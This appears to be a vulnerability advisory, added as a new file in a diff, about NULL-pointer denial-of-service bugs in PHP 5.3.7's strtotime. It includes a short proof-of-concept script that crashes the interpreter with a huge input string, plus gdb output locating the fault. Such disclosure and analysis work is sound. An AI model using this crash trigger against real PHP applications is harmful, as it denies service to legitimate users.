@@ -1,0 +1,32 @@
+source: http://www.securityfocus.com/bid/49249/info
+
+PHP is prone to multiple denial-of-service vulnerabilities caused by a NULL-pointer dereference.
+
+An attacker can exploit these issues to cause an application written in PHP to crash, denying service to legitimate users.
+
+PHP 5.3.7 is vulnerable; other versions may also be affected. 
+
+127# ulimit -m 100000
+127# ulimit -v 100000
+127# cat /www/strtotime.php
+<?php
+$strx=str_repeat("A",$argv[1]);
+var_dump(strtotime($strx));
+?>127#
+127#  /cxib/5371/build/bin/php /www/strtotime.php 33388888
+Memory fault (core dumped)
+
+127# gdb -q /cxib/5371/build/bin/php
+(gdb) r /www/strtotime.php 33388888
+Starting program: /cxib/5371/build/bin/php /www/strtotime.php 33388888
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0806e8bd in add_error (s=0xbfbfcf90,
+    error=0x83ea7d8 "Double timezone specification")
+    at /cxib/5371/ext/date/lib/parse_date.c:355
+355             s->errors->error_messages[s->errors->error_count -
+1].position = s->tok ? s->tok - s->str : 0;
+(gdb) print s->errors->error_messages
+$1 = (struct timelib_error_message *) 0x0
+(gdb) print s->errors->error_count
+$2 = 1835009
